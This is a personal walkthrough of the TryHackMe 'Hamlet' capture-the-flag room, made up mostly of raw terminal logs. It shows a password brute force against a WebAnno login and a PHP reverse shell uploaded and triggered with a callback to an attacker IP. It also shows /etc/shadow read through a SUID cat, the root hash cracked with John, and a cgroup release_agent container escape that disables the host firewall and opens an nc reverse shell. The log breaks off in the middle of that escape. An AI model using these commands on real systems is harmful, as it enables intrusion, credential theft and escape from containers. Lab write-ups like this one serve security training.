----
A Shakespeare/Hamlet-inspired room in which you will explore an uncommon web application used in linguistic/NLP research.
----

![](https://i.imgur.com/aoogIkf.jpeg)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/7c3ed8c81855bd05c6e7c8815ac26f37.png)

### Task 1  To hack, or not to hack, that is the question.

 Start Machine

Welcome to **Hamlet**! 

This is a fairly straightforward CTF-like room in which you will play with an uncommon web application used in linguistic research. You will also learn a little bit about Docker. While there are CTF elements, there are quite a few "real" problems in here. Feel free to explore!

In the [associated GitHub repository](https://github.com/IngoKl/THM-Hamlet), you will find detailed information about this room as well as the learning objectives. That said, I would recommend trying this room as a challenge first.

There's a total of **six flags**. You don't necessarily have to find them in order. (**F****lags:** THM{#_flag})

Please note that the machine **takes a while to boot fully**, and some services will only become available after a few minutes.  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.44.208 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.44.208:21
Open 10.10.44.208:22
Open 10.10.44.208:80
Open 10.10.44.208:501
Open 10.10.44.208:8000
Open 10.10.44.208:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-04 20:33 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:33
Completed NSE at 20:33, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:33
Completed Parallel DNS resolution of 1 host. at 20:33, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:33
Scanning 10.10.44.208 [6 ports]
Discovered open port 80/tcp on 10.10.44.208
Discovered open port 8080/tcp on 10.10.44.208
Discovered open port 22/tcp on 10.10.44.208
Discovered open port 21/tcp on 10.10.44.208
Discovered open port 8000/tcp on 10.10.44.208
Discovered open port 501/tcp on 10.10.44.208
Completed Connect Scan at 20:33, 0.17s elapsed (6 total ports)
Initiating Service scan at 20:33
Scanning 6 services on 10.10.44.208
Completed Service scan at 20:33, 23.57s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.44.208.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:33
NSE: [ftp-bounce 10.10.44.208:21] PORT response: 500 Illegal PORT command.
Completed NSE at 20:34, 14.28s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:34
Completed NSE at 20:34, 2.15s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:34
Completed NSE at 20:34, 0.00s elapsed
Nmap scan report for 10.10.44.208
Host is up, received user-set (0.17s latency).
Scanned at 2023-08-04 20:33:28 EDT for 41s

PORT     STATE SERVICE    REASON  VERSION
21/tcp   open  ftp        syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxr-xr-x    1 0        0             113 Sep 15  2021 password-policy.md
|_-rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
22/tcp   open  ssh        syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a0ef4c3228a64c7f60d6a66332acab27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5/i3O28uWolhittypXr6mAEk+XOV998o/e/3wIWpGq9J1GhtGc3J4uwYpBt7SiS3mZivq9D5jgFhqhHb6zlBsQmGUnXUnQNYyqrBmGnyl4urp5IuV1sRCdNXQdt/lf6Z9A807OPuCkzkAexFUV28eXqdXpRsXXkqgkl5DCm2WEtV7yxPIbGlcmX+arDT9A5kGTZe9rNDdqzSafz0aVKRWoTHGHuqVmq0oPD3Cc3oYfoLu7GTJV+Cy6Hxs3s6oUVcruoi1JYvbxC9whexOr+NSZT9mGxDSDLS6jEMim2DQ+hNhiT49JXcMXhQ2nOYqBXLZF0OYyNKaGdgG35CIT40z
|   256 5a6d1a399700bec7106e365c7fcadcb2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHtt/3Q8agNKO48Zw3srosCs+bfCx47O+i4tBUX7VGMSpzTJQS3s4DBhGvrvO+d/u9B4e9ZBgWSqo+aDqGsTZxQ=
|   256 0b7740b2cc308d8e4551fa127ce295c7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIN4jv01JeDGsDfhWIJMF8HBv26FI18VLpBeNoiSGbKVp
80/tcp   open  http       syn-ack lighttpd 1.4.45
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Hamlet Annotation Project
|_http-server-header: lighttpd/1.4.45
501/tcp  open  tcpwrapped syn-ack
8000/tcp open  http       syn-ack Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-open-proxy: Proxy might be redirecting requests
8080/tcp open  http-proxy syn-ack
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 500 
|     Content-Type: application/json;charset=UTF-8
|     Date: Sat, 05 Aug 2023 00:33:37 GMT
|     Connection: close
|     {"timestamp":1691195617688,"status":500,"error":"Internal Server Error","exception":"org.springframework.security.web.firewall.RequestRejectedException","message":"The request was rejected because the URL contained a potentially malicious String "%2e"","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 
|     Set-Cookie: JSESSIONID=4BD4816EA50C9F4C33DD67D9949B1FD8; Path=/; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: SAMEORIGIN
|     Location: http://localhost:8080/login.html
|     Content-Length: 0
|     Date: Sat, 05 Aug 2023 00:33:36 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 302 
|     Set-Cookie: JSESSIONID=F7C29486E8AF3C986D9C9F9F6B34288A; Path=/; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: SAMEORIGIN
|     Location: http://localhost:8080/login.html
|     Content-Length: 0
|     Date: Sat, 05 Aug 2023 00:33:36 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sat, 05 Aug 2023 00:33:37 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-favicon: Spring Java Framework
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-open-proxy: Proxy might be redirecting requests
| http-title: WebAnno - Log in 
|_Requested resource was http://10.10.44.208:8080/login.html
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=8/4%Time=64CD98DF%P=x86_64-pc-linux-gnu%r(Get
SF:Request,18F,"HTTP/1\.1\x20302\x20\r\nSet-Cookie:\x20JSESSIONID=4BD4816E
SF:A50C9F4C33DD67D9949B1FD8;\x20Path=/;\x20HttpOnly\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Contr
SF:ol:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragm
SF:a:\x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20SAMEORIGIN\r\nLo
SF:cation:\x20http://localhost:8080/login\.html\r\nContent-Length:\x200\r\
SF:nDate:\x20Sat,\x2005\x20Aug\x202023\x2000:33:36\x20GMT\r\nConnection:\x
SF:20close\r\n\r\n")%r(HTTPOptions,18F,"HTTP/1\.1\x20302\x20\r\nSet-Cookie
SF::\x20JSESSIONID=F7C29486E8AF3C986D9C9F9F6B34288A;\x20Path=/;\x20HttpOnl
SF:y\r\nX-Content-Type-Options:\x20nosniff\r\nX-XSS-Protection:\x201;\x20m
SF:ode=block\r\nCache-Control:\x20no-cache,\x20no-store,\x20max-age=0,\x20
SF:must-revalidate\r\nPragma:\x20no-cache\r\nExpires:\x200\r\nX-Frame-Opti
SF:ons:\x20SAMEORIGIN\r\nLocation:\x20http://localhost:8080/login\.html\r\
SF:nContent-Length:\x200\r\nDate:\x20Sat,\x2005\x20Aug\x202023\x2000:33:36
SF:\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\
SF:x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Langu
SF:age:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Sat,\x2005\x20Aug\x202
SF:023\x2000:33:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html
SF:><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x9
SF:3\x20Bad\x20Request</title><style\x20type=\"text/css\">body\x20{font-fa
SF:mily:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:whit
SF:e;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-
SF:size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x
SF:20{color:black;}\x20\.line\x20{height:1px;background-color:#525D76;bord
SF:er:none;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93
SF:\x20Bad\x20Request</h1></body></html>")%r(FourOhFourRequest,1A4,"HTTP/1
SF:\.1\x20500\x20\r\nContent-Type:\x20application/json;charset=UTF-8\r\nDa
SF:te:\x20Sat,\x2005\x20Aug\x202023\x2000:33:37\x20GMT\r\nConnection:\x20c
SF:lose\r\n\r\n{\"timestamp\":1691195617688,\"status\":500,\"error\":\"Int
SF:ernal\x20Server\x20Error\",\"exception\":\"org\.springframework\.securi
SF:ty\.web\.firewall\.RequestRejectedException\",\"message\":\"The\x20requ
SF:est\x20was\x20rejected\x20because\x20the\x20URL\x20contained\x20a\x20po
SF:tentially\x20malicious\x20String\x20\\\"%2e\\\"\",\"path\":\"/nice%20po
SF:rts%2C/Tri%6Eity\.txt%2ebak\"}");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:34
Completed NSE at 20:34, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:34
Completed NSE at 20:34, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:34
Completed NSE at 20:34, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.16 seconds

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.44.208
Connected to 10.10.44.208.
220 (vsFTPd 3.0.3)
Name (10.10.44.208:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||50574|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 Sep 15  2021 .
drwxr-xr-x    2 0        114          4096 Sep 15  2021 ..
-rwxr-xr-x    1 0        0             113 Sep 15  2021 password-policy.md
-rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
226 Directory send OK.
ftp> more password-policy.md
# Password Policy

## WebAnno

New passwords should be:

- lowercase
- between 12 and 14 characters long

ftp> more ufw.status
Status: active

To                         Action      From
--                         ------      ----
20/tcp                     ALLOW       Anywhere                  
21/tcp                     ALLOW       Anywhere                  
22/tcp                     ALLOW       Anywhere                  
80/tcp                     ALLOW       Anywhere                  
501/tcp                    ALLOW       Anywhere                  
8080/tcp                   ALLOW       Anywhere                  
8000/tcp                   ALLOW       Anywhere                  
1603/tcp                   ALLOW       Anywhere                  
1564/tcp                   ALLOW       Anywhere                  
50000:50999/tcp            ALLOW       Anywhere                  
20/tcp (v6)                ALLOW       Anywhere (v6)             
21/tcp (v6)                ALLOW       Anywhere (v6)             
22/tcp (v6)                ALLOW       Anywhere (v6)             
80/tcp (v6)                ALLOW       Anywhere (v6)             
501/tcp (v6)               ALLOW       Anywhere (v6)             
8080/tcp (v6)              ALLOW       Anywhere (v6)             
8000/tcp (v6)              ALLOW       Anywhere (v6)             
1603/tcp (v6)              ALLOW       Anywhere (v6)             
1564/tcp (v6)              ALLOW       Anywhere (v6)             
50000:50999/tcp (v6)       ALLOW       Anywhere (v6)  

Using active mode, at least using the standard FTP client, won't work very well.

┌──(witty㉿kali)-[~]
└─$ ftp 10.10.44.208
Connected to 10.10.44.208.
220 (vsFTPd 3.0.3)
Name (10.10.44.208:witty): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> passive
Passive mode: on; fallback to active mode: on.
ftp> dir
229 Entering Extended Passive Mode (|||50688|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             113 Sep 15  2021 password-policy.md
-rw-r--r--    1 0        0            1425 Sep 15  2021 ufw.status
226 Directory send OK.


Welcome to the Hamlet Annotation Project

We are a small group of researchers annotating Shakespeare's Hamlet using WebAnno. This is the version of the play we are currently using.

If you want to help out, send an email to Michael 'ghost' Canterbury (ghost@webanno.hamlet.thm). He's obsessed with Hamlet and the vocabulary used by Shakespeare.

http://10.10.44.208/hamlet.txt

http://10.10.44.208:8000/

http://10.10.44.208:8080/login.html 

https://webanno.github.io/webanno/
https://github.com/webanno/webanno

http://10.10.44.208:501/

GRAVEDIGGER
What do you call a person who builds stronger things than a stonemason, a shipbuilder, or a carpenter does?
PENTESTER
ou com'st
PENTESTER

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.44.208 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.44.208
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/08/04 20:44:09 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.44.208/index.html           (Status: 200) [Size: 1011]
http://10.10.44.208/robots.txt           (Status: 200) [Size: 64]
Progress: 4611 / 4615 (99.91%)
===============================================================
2023/08/04 20:44:25 Finished
===============================================================

User-agent: *
Allow: /

THM{1_most_mechanical_and_dirty_hand}

Clo. What is he that builds stronger then either the
Mason, the Shipwright, or the Carpenter?
  Other. The Gallowes maker; for that Frame outliues a
thousand Tenants

┌──(witty㉿kali)-[~]
└─$ nc 10.10.44.208 501 -nv
(UNKNOWN) [10.10.44.208] 501 (?) open
GRAVEDIGGER
What do you call a person who builds stronger things than a stonemason, a shipbuilder, or a carpenter does?
PENTESTER
?
ne: Thy Mothers poyson'd:
I can
PENTESTER
Gallowes
signing his name with several different spel
PENTESTER
Gallows
Bugges and Go
PENTESTER
gallows
THM{2_ophelia_s_grave}

┌──(witty㉿kali)-[~/Downloads]
└─$ cewl -m 12 --lowercase -w hamlet_pass http://10.10.44.208/hamlet.txt
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ wc -l hamlet_pass 
75 hamlet_pass

another way

┌──(witty㉿kali)-[~/Downloads]
└─$ cewl http://10.10.44.208/hamlet.txt --lowercase | awk 'length($0)>=12 && length($0)<=14' | uniq > wordlist_hamlet.txt
                                                                                
┌──(witty㉿kali)-[~/Downloads]
└─$ wc -l wordlist_hamlet.txt 
74 wordlist_hamlet.txt

┌──(witty㉿kali)-[~/Downloads]
└─$ awk '{ print length($0) }' wordlist_hamlet.txt 
13
12
14

using burp intruder

urlfragment=&username=ghost+&password=§test§

urlfragment=&username=ghost+&password=vnsanctified (302 status)

<iframe style="width:100%; height:100%" src="/repository/project/0/document/0/source/hamlet.txt"></iframe>

"/repository/project/" webanno

documentUri="file:/srv/inception/_repository/project_/14/document/6929/source/example_txt.txt" 

http://10.10.44.208:8080/users.html?18

users: admin ghost and ophelia

change ophelia's pass

see annotations 

http://10.10.44.208:8080/annotation.html?4#!p=0&d=0&f=1

KEQehFDWwuQbMbKW

┌──(witty㉿kali)-[~/Downloads]
└─$ ftp 10.10.44.208
Connected to 10.10.44.208.
220 (vsFTPd 3.0.3)
Name (10.10.44.208:witty): ophelia
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||50927|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Sep 15  2021 .
drwxr-xr-x    5 0        0            4096 Sep 15  2021 ..
-rw-r--r--    1 1001     1001           31 Sep 16  2021 flag
226 Directory send OK.
ftp> more flag
THM{3_i_was_the_more_deceived}

revshell

http://10.10.44.208:8080/projectsetting.html?4

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php        
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>   

import it

/repository/project/<project_id>/document/<document_id>/source/<filename>

in our case will be document_id 1 cz hamlet.txt is 0

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://10.10.44.208:8000/repository/project/0/document/1/source/payload_ivan.php

┌──(witty㉿kali)-[~]
└─$ rlwrap nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.44.208] 50236
SOCKET: Shell has connected! PID: 24
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
sh: 1: python3: not found
sh: 1: python: not found
www-data@66505608bd11:/var/www/html/repository/project/0/document/1/source$ ls
<www/html/repository/project/0/document/1/source$ ls                        
payload_ivan.php

www-data@66505608bd11:/var/www/html/repository/project/0/document/0$ ls -lah /
<www/html/repository/project/0/document/0$ ls -lah /                 
total 88K
drwxr-xr-x   1 root root 4.0K Sep 15  2021 .
drwxr-xr-x   1 root root 4.0K Sep 15  2021 ..
-rwxr-xr-x   1 root root    0 Sep 15  2021 .dockerenv
drwxr-xr-x   1 root root 4.0K Sep  3  2021 bin
drwxr-xr-x   2 root root 4.0K Apr 10  2021 boot
drwxr-xr-x  13 root root 3.5K Aug  5 00:29 dev
drwxr-xr-x   1 root root 4.0K Sep 15  2021 etc
drwxr-xr-x   2 root root 4.0K Apr 10  2021 home
drwxr-xr-x   1 root root 4.0K Sep  3  2021 lib
drwxr-xr-x   2 root root 4.0K Sep  2  2021 lib64
drwxr-xr-x   2 root root 4.0K Sep  2  2021 media
drwxr-xr-x   2 root root 4.0K Sep  2  2021 mnt
drwxr-xr-x   2 root root 4.0K Sep  2  2021 opt
dr-xr-xr-x 119 root root    0 Aug  5 00:29 proc
drwx------   1 root root 4.0K Sep 15  2021 root
drwxr-xr-x   1 root root 4.0K Sep  3  2021 run
drwxr-xr-x   1 root root 4.0K Sep  3  2021 sbin
drwxr-xr-x   2 root root 4.0K Sep  2  2021 srv
drwxr-xr-x   2 root root 4.0K Sep 15  2021 stage
dr-xr-xr-x  13 root root    0 Aug  5 00:29 sys
drwxrwxrwt   1 root root 4.0K Sep  3  2021 tmp
drwxr-xr-x   1 root root 4.0K Sep  2  2021 usr
drwxr-xr-x   1 root root 4.0K Sep  3  2021 var

www-data@66505608bd11:/stage$ cat flag
cat flag
THM{4_the_murder_of_gonzago}

www-data@66505608bd11:/var/www/html/repository/project/0/document/1/source$ find / -perm -4000 -type f -exec ls -al {} 2>/dev/null \;
< -perm -4000 -type f -exec ls -al {} 2>/dev/null \;                        
-rwsr-xr-x 1 root root 35040 Jul 28  2021 /bin/umount
-rwsr-xr-x 1 root root 55528 Jul 28  2021 /bin/mount
-rwsr-xr-x 1 root root 43936 Sep 24  2020 /bin/cat
-rwsr-xr-x 1 root root 71912 Jul 28  2021 /bin/su
-rwsr-xr-x 1 root root 63960 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 58416 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 88304 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44632 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 52880 Feb  7  2020 /usr/bin/chsh

www-data@66505608bd11:/var/www/html/repository/project/0/document/1/source$ cat /etc/shadow
<sitory/project/0/document/1/source$ cat /etc/shadow                        
root:$y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4:18885:0:99999:7::

└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $y$j9T$.9s2wZRY3hcP/udKIFher1$sIBIYsiMmFlXhKOO4ZDJDXo54byuq7a4xAD0k9jw2m4

 Not Found.
--------------------------------------------------


https://security.stackexchange.com/questions/248994/can-anyone-identify-the-y-hash-prefix-or-identify-what-hash-this-could-be

So it turns out that it is a yescrypt hash and isn't supported by hashcat for cracking yet

https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt

--format=crypt

┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash_hamlet 
Using default input encoding: UTF-8
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 0 for all loaded hashes
Cost 2 (algorithm specific iterations) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
murder           (?)     
1g 0:00:00:54 DONE (2023-08-04 22:30) 0.01832g/s 89.71p/s 89.71c/s 89.71C/s 2222222..asasas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

www-data@66505608bd11:/stage$ su root
su root
Password: murder

root@66505608bd11:/stage# cd /root
cd /root
root@66505608bd11:~# ls -lah
ls -lah
total 20K
drwx------ 1 root root 4.0K Sep 15  2021 .
drwxr-xr-x 1 root root 4.0K Sep 15  2021 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root   24 Sep 16  2021 .flag
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
root@66505608bd11:~# cat .flag
cat .flag
THM{5_murder_most_foul}

root@66505608bd11:~# fdisk
fdisk
bash: fdisk: command not found


root@66505608bd11:~# ls -la /dev | grep disk
ls -la /dev | grep disk
crw-rw----  1 root disk     10, 234 Aug  5 00:29 btrfs-control
brw-rw----  1 root disk    253,   0 Aug  5 00:29 dm-0
crw-rw----  1 root disk     10, 237 Aug  5 00:29 loop-control
brw-rw----  1 root disk      7,   0 Aug  5 00:29 loop0
brw-rw----  1 root disk      7,   1 Aug  5 00:29 loop1
brw-rw----  1 root disk      7,   2 Aug  5 00:29 loop2
brw-rw----  1 root disk      7,   3 Aug  5 00:29 loop3
brw-rw----  1 root disk      7,   4 Aug  5 00:29 loop4
brw-rw----  1 root disk      7,   5 Aug  5 00:29 loop5
brw-rw----  1 root disk      7,   6 Aug  5 00:29 loop6
brw-rw----  1 root disk      7,   7 Aug  5 00:29 loop7
brw-rw----  1 root disk    202,   0 Aug  5 00:29 xvda
brw-rw----  1 root disk    202,   1 Aug  5 00:29 xvda1
brw-rw----  1 root disk    202,   2 Aug  5 00:29 xvda2
brw-rw----  1 root disk    202,   3 Aug  5 00:29 xvda3
brw-rw----  1 root disk    202, 112 Aug  5 00:29 xvdh

root@66505608bd11:~# mkdir -p /mnt/host
mkdir -p /mnt/host
root@66505608bd11:~# mount /dev/xvda2 /mnt/host
mount /dev/xvda2 /mnt/host
root@66505608bd11:~# cd /mnt/host
cd /mnt/host
root@66505608bd11:/mnt/host# ls
ls
System.map-4.15.0-156-generic  initrd.img-4.15.0-156-generic
config-4.15.0-156-generic      lost+found
grub			       vmlinuz-4.15.0-156-generic

root@66505608bd11:/# mount /dev/dm-0 /mnt/host
mount /dev/dm-0 /mnt/host
root@66505608bd11:/# cd /mnt/host
cd /mnt/host
root@66505608bd11:/mnt/host# ls
ls
bin    dev   initrd.img      lib64	 mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib	     media	 proc  sbin  swap.img  usr  vmlinuz.old
root@66505608bd11:/mnt/host# cd /root
cd /root
root@66505608bd11:~# ls
ls
root@66505608bd11:~# ls -lah
ls -lah
total 20K
drwx------ 1 root root 4.0K Sep 15  2021 .
drwxr-xr-x 1 root root 4.0K Aug  5 03:18 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root   24 Sep 16  2021 .flag
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
root@66505608bd11:~# cat .flag
cat .flag
THM{5_murder_most_foul}

nope

like you're in a cave but disabling ufw (scaping container)

mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd
echo "ufw --force disable" >> /cmd
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

root@66505608bd11:~# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
<group -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@66505608bd11:~# echo 1 > /tmp/cgrp/x/notify_on_release
echo 1 > /tmp/cgrp/x/notify_on_release
root@66505608bd11:~# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
<h=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@66505608bd11:~# echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo "$host_path/cmd" > /tmp/cgrp/release_agent
root@66505608bd11:~# echo '#!/bin/bash' > /cmd
echo '#!/bin/bash' > /cmd
root@66505608bd11:~# echo "ufw --force disable" >> /cmd
echo "ufw --force disable" >> /cmd
root@66505608bd11:~# echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" >> /cmd
